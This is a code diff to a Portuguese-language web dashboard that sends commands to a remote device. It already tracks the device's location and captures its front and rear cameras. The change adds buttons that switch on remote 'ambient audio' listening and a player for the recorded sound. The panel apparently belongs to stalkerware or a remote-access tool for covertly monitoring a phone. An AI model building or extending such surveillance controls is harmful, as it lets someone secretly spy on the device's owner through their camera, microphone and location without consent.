@@ -34,6 +34,9 @@
         .cam-frame { width: 100%; aspect-ratio: 4/3; background: #000; display: flex; align-items: center; justify-content: center; }
         .cam-frame img { width: 100%; height: 100%; object-fit: cover; display: none; }
         .cam-placeholder { font-size: 11px; color: #334155; }
+        .audio-section { margin-bottom: 15px; }
+        .audio-section h3 { color: #f59e0b; font-size: 13px; margin-bottom: 8px; text-transform: uppercase; }
+        .audio-player { width: 100%; height: 40px; border-radius: 8px; background: #0a0a0a; border: 1px solid #1e293b; }
         .error-box { background: #450a0a; border: 1px solid #991b1b; padding: 15px; border-radius: 8px; text-align: center; margin-bottom: 20px; color: #fca5a5; display: none; }
         .status-dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 5px; }
         .status-online { background: #22c55e; box-shadow: 0 0 10px #22c55e; animation: pulse 1.5s infinite; }
@@ -67,6 +70,16 @@
                 <button class="btn-cmd" onclick="enviarComando('lanterna')">💡</button>
             </div>
             <button class="btn-camera" onclick="enviarComando('take_dual')">📸 Capturar</button>
+            <div class="btn-row">
+                <button class="btn-cmd" onclick="enviarComando('audio_on')" style="background:#ef4444;color:#fff;">🎤 Ouvir</button>
+                <button class="btn-cmd" onclick="enviarComando('audio_off')" style="background:#64748b;color:#fff;">🔇 Parar</button>
+            </div>
+            <div class="audio-section">
+                <h3>🎤 Áudio Ambiente</h3>
+                <audio id="audioPlayer" class="audio-player" controls>
+                    <source src="" type="audio/wav">
+                </audio>
+            </div>
             <div class="cameras-row">
                 <div class="cam-card"><div class="cam-card-title">🎥 Frontal</div><div class="cam-frame"><span id="labelFront" class="cam-placeholder">Sem Sinal</span><img id="imgFront"></div></div>
                 <div class="cam-card"><div class="cam-card-title">🎥 Traseira</div><div class="cam-frame"><span id="labelBack" class="cam-placeholder">Sem Sinal</span><img id="imgBack"></div></div>
@@ -113,18 +126,20 @@
                         if (pontos.length > 100) pontos.shift();
                         linha.setLatLngs(pontos);
                     }
-                    // Fotos - CORRIGIDO
+                    // Fotos
                     if (data.photo_front && data.photo_front.length > 100) {
-                        console.log("✅ Frontal recebida: " + data.photo_front.substring(0, 50) + "...");
                         document.getElementById('labelFront').style.display = 'none';
                         document.getElementById('imgFront').src = 'data:image/jpeg;base64,' + data.photo_front;
                         document.getElementById('imgFront').style.display = 'block';
                     }
                     if (data.photo_back && data.photo_back.length > 100) {
-                        console.log("✅ Traseira recebida: " + data.photo_back.substring(0, 50) + "...");
                         document.getElementById('labelBack').style.display = 'none';
                         document.getElementById('imgBack').src = 'data:image/jpeg;base64,' + data.photo_back;
                         document.getElementById('imgBack').style.display = 'block';
+                    }
+                    // Áudio
+                    if (data.audio && data.audio.length > 100) {
+                        document.getElementById('audioPlayer').src = 'data:audio/wav;base64,' + data.audio;
                     }
                 } else {
                     document.getElementById('errorBox').style.display = 'block';
